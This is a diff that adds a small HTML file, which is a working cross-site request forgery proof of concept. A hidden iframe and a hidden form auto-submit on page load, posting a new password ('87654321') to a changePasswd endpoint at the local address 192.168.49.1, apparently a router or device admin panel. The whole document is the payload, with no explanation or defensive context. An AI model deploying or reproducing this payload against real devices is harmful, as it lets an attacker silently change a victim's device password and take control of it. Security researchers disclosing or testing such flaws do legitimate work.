@@ -1,0 +1,5 @@
+<iframe style='display:none' name='csrf-frame'></iframe>
+<form id='csrf-form' target='csrf-frame' method='post' action='https://192.168.49.1/changePasswd'>
+	<input type='hidden' name='passwd' value='87654321'>
+</form>
+<script>document.getElementById('csrf-form').submit()</script>
